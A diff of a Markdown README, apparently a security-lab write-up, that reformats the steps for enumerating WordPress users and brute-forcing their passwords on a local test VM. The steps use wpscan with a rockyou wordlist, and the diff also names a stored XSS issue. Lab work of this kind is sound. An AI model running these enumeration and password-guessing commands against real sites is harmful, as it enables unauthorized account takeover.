@@ -32,26 +32,23 @@ Time spent: 6 hours spent in total
     - Fixed in version: N/A
   - [ ] GIF Walkthrough: <br />
      ![](EramUserEnumerating.gif)
-  - [ ] Steps to recreate: <br /> <ul><li>Install worlists and get rockyou-75.txt. Make sure rockyou-75.txt is in /home/kali/Desktop/rockyou-75.txt</li> 
+  - [ ] Steps to recreate: 
+    - Install worlists and get rockyou-75.txt. Make sure rockyou-75.txt is in /home/kali/Desktop/rockyou-75.txt
   ``` 
       $ apt-get install wordlists
       $ cd \usr\share\wordlists\
       $ gzip -d rockyou-75.txt.gz 
   ``` 
-  <li> Get Api token from https://wpvulndb.com/ </li><li> use token to find users : </li>
- ``` 
-      $ apt-get install wordlists
-      $ cd \usr\share\wordlists\
-      $ gzip -d rockyou-75.txt.gz 
-  ``` 
+    - Get Api token from https://wpvulndb.com/ 
+    - use token to find users : 
   ```
       $ wpscan --url wpdistillery.vm -e u vp --api-token (token name) 
   ```
-  </li><li> use token to find password using rockyou-75.txt file: </li>
+  - use token to find password using rockyou-75.txt file: 
   ```
       $ wpscan --url wpdistillery.vm -e u --passwords /home/kali/Desktop/rockyou-75.txt --api-token (token name)
   ```
-  </ul>
+
   - [ ] Affected source code:
     - [Link 1](https://github.com/WordPress/WordPress/blob/master/wp-login.php) 
 4. (Optional) Vulnerability Name or ID: Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
